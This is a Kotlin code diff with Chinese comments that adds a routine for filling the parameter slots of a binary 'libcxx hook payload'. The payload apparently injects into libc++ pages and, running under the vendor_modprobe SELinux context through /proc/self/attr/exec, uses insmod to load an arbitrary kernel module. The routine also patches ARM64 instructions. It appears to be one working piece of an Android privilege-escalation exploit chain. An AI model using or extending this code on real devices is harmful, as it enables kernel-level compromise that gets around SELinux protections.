@@ -161,6 +161,69 @@ class Assembled43284(
         block[at + 3] = ((word shr 24) and 0xFF).toByte()
         return if (writeBlock(ticket, blockAt, block) == 0) 0 else -3
     }
+    /**
+     * 把 libcxx 钩子载荷的 7 个参数槽填好（上游 libcxx.S 的 .data 布局，取自成功历史 dev 的 hook_patch）。
+     *
+     * 槽位（偏移/容量）：mutex_file 0x00/8 · selinux_ctx 0x08/23 · selinux 长度指令 0x16C/4 ·
+     * attr_exec 0x1F/21 · insmod 路径 0x34/19 · 目标 ko 0x47/64 · 被顶掉的指令 0x1D0/4。
+     * 字节串不许为空且要留一个 NUL；长度指令是 MOVZ W2,#imm16（0xD2800000 | imm16<<5 | 2）。
+     * 载荷落进 libc++ 页后由它自己 insmod —— 没人填槽，就永远不会有加载发生。
+     *
+     * @param blob 载荷本体（就地修改）。
+     * @param carrierPath 目标 ko 的路径（不超过 63 字节）。
+     * @return 0 成功；-1 blob 太短；-2 某槽为空或超容量。
+     */
+    fun fillPayloadSlots(
+        blob: ByteArray,
+        carrierPath: String,
+        selinuxContext: String = "u:r:vendor_modprobe:s0",
+        insmodPath: String = "/vendor/bin/insmod",
+        mutexPath: String = "/dev/df",
+        attrExecPath: String = "/proc/self/attr/exec",
+        displaced: Int? = null,
+    ): Int {
+        if (blob.size < 0x1D4) {
+            return -1
+        }
+        fun put(offset: Int, capacity: Int, value: String): Boolean {
+            if (value.isEmpty() || value.length >= capacity) {
+                return false
+            }
+            for (index in 0 until capacity) {
+                blob[offset + index] = 0
+            }
+            val bytes = value.toByteArray()
+            for (index in bytes.indices) {
+                blob[offset + index] = bytes[index]
+            }
+            return true
+        }
+        if (!put(0x00, 8, mutexPath)) {
+            return -2
+        }
+        if (!put(0x08, 23, selinuxContext)) {
+            return -2
+        }
+        if (!put(0x1F, 21, attrExecPath)) {
+            return -2
+        }
+        if (!put(0x34, 19, insmodPath)) {
+            return -2
+        }
+        if (!put(0x47, 64, carrierPath)) {
+            return -2
+        }
+        val lengthWord = 0xD2800000.toInt() or ((selinuxContext.length and 0xFFFF) shl 5) or 2
+        for (index in 0 until 4) {
+            blob[0x16C + index] = ((lengthWord shr (index * 8)) and 0xFF).toByte()
+        }
+        if (displaced != null) {
+            for (index in 0 until 4) {
+                blob[0x1D0 + index] = ((displaced shr (index * 8)) and 0xFF).toByte()
+            }
+        }
+        return 0
+    }
     fun hookPlan(symbol: String, guardPolicy: Int = 0): LongArray? {
         val refusal = refusalSlot()
         val out = LongArray(4)
